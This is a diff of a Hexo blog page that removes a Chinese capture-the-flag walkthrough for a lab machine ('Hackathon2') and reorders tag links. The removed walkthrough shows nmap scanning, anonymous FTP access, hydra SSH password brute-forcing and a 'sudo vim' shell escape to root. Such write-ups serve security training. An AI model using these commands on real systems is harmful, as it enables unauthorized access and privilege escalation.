@@ -269,36 +269,7 @@
   <div class="article-entry" itemprop="articleBody">
  
 
-	
-		<span id="more"></span>
-
-<h3 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="number">192.168</span><span class="selector-class">.91</span><span class="selector-class">.0</span>/<span class="number">24</span>  # 查询存活端口</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-A</span> <span class="selector-tag">-sS</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-p-</span> <span class="number">192.168</span><span class="selector-class">.91</span><span class="selector-class">.139</span> # 深度扫描</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Hackathon2/1.png"></p>
-<p>扫描发现端口21，80，7223端口开放，其中21端口对应ftp服务，且通过扫描结果可以看出可以采用匿名登录，而7223端口是在80端口下开放的，是ssh服务</p>
-<h3 id="二、第一个flag"><a href="#二、第一个flag" class="headerlink" title="二、第一个flag"></a>二、第一个flag</h3><p>匿名登陆ftp，将其中两个文件下载下来</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ftp</span> <span class="number">192.168</span><span class="selector-class">.91</span><span class="selector-class">.139</span></span><br><span class="line"><span class="selector-tag">anonymous</span></span><br><span class="line">密码随便</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Hackathon2/2.png"></p>
-<p>查看flag1.txt获取第一个flag<br><img src="/Hackathon2/3.png"></p>
-<h3 id="三、第二个flag"><a href="#三、第二个flag" class="headerlink" title="三、第二个flag"></a>三、第二个flag</h3><p>查看另一个文件word.dir</p>
-<p><img src="/Hackathon2/4.png"></p>
-<p>查看网站没有找到什么有用的信息，发现里面的happy有点可以，于是尝试访问，访问得通，查看源代码</p>
-<p><img src="/Hackathon2/5.png"></p>
-<p>发现一个username，结合前面端口扫描7223端口开放，猜测这应该是ssh登录的用户</p>
-<p>且前面给了个word.dir字典，尝试用hydra爆破密码试试</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> <span class="selector-tag">-l</span> <span class="selector-tag">hackathonll</span> <span class="selector-tag">-P</span> <span class="selector-tag">word</span><span class="selector-class">.dir</span> <span class="selector-tag">ssh</span>:<span class="comment">//192.168.91.139:7223 -f</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/Hackathon2/6.png"></p>
-<p>ssh远程连接</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">hackathonll</span>@<span class="number">192.168</span><span class="selector-class">.91</span><span class="selector-class">.139</span> <span class="selector-tag">-p</span> <span class="number">7223</span></span><br></pre></td></tr></table></figure>
-
-<p>提权</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">-l</span></span><br><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">vim</span> <span class="selector-tag">-c</span> &#x27;:!/<span class="selector-tag">bin</span>/<span class="selector-tag">sh</span>&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>在root目录下获得第二个flag</p>
-<p><img src="/Hackathon2/7.png"></p>
-
+			<h3 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h3>
 	
 
 
@@ -1300,6 +1271,10 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">伪协议</a>
               </li>
              
@@ -1312,10 +1287,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
               </li>
              
@@ -1324,11 +1295,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">--红日靶场</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color2">--红日靶场</a>
               </li>
             
             <div class="clearfix"></div>
